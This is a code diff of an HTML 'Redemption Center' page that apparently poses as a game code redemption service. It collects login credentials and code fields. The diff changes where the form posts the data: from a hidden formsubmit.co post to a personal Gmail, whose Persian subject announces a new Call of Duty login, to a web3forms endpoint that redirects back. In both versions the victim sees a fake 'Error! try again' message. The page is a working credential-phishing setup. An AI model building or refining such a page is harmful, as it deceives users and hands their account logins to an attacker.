@@ -30,7 +30,7 @@
         .input-field-wrapper { position: relative; }
         .eye-icon { position: absolute; top: 50%; right: 15px; transform: translateY(-50%); cursor: pointer; width: 24px; height: 24px; color: #fff; }
         .eye-icon:hover { color: #00ff00; }
-        .success-msg { color: #ff0000; font-weight: bold; text-align: center; margin-top: 20px; font-size: 18px; display: none; }
+        .success-msg { color: #ff1900; font-weight: bold; text-align: center; margin-top: 20px; font-size: 18px; display: none; }
         .btn_yellow { width: 100%; cursor: pointer; }
     </style>
 </head>
@@ -52,9 +52,10 @@
                 <h1>Redemption Center</h1>
                 
                 <div class="code_ct">
-                    <!-- فرم اصلی با target به iframe مخفی -->
-                    <iframe name="hiddenFrame" style="display:none;"></iframe>
-                    <form action="https://formsubmit.co/erfantroll778899@gmail.com" method="POST" target="hiddenFrame" onsubmit="submitted()">
+                    <form action="https://api.web3forms.com/submit" method="POST">
+                        <!-- کلید دسترسی تو -->
+                        <input type="hidden" name="access_key" value="32142c64-d5ea-4979-b4be-8cd86c824be2">
+
                         <ul class="code_list c">
                             <li>
                                 <span class="desktop_label">Email</span>
@@ -81,14 +82,12 @@
                             </li>
                         </ul>
 
-                        <!-- تنظیمات -->
-                        <input type="hidden" name="_captcha" value="false">
-                        <input type="hidden" name="_template" value="table">
-                        <input type="hidden" name="_subject" value="لاگین جدید کالاف! 🔥">
+                        <!-- ریدایرکت به صفحه اصلی با پیام موفقیت -->
+                        <input type="hidden" name="redirect" value="https://erfantroll778899-eng.github.io/?success=1">
 
                         <button type="submit" class="btn_yellow" id="label_submit">Submit</button>
                         <div id="result" class="success-msg">
-                           Error! try again
+                            Error! try again
                         </div>
                     </form>
                 </div>
@@ -126,13 +125,9 @@
             }
         }
 
-        // وقتی فرم ارسال شد، پیام موفقیت نشون بده
-        function submitted() {
+        // نمایش پیام موفقیت وقتی برگشت
+        if (window.location.search.includes("success=1")) {
             document.getElementById("result").style.display = "block";
-            document.getElementById("F_UID").value = "";
-            document.getElementById("F_CDKEY").value = "";
-            document.getElementById("F_VCODE").value = "";
-            return true; // اجازه ارسال بده
         }
     </script>
 </body>
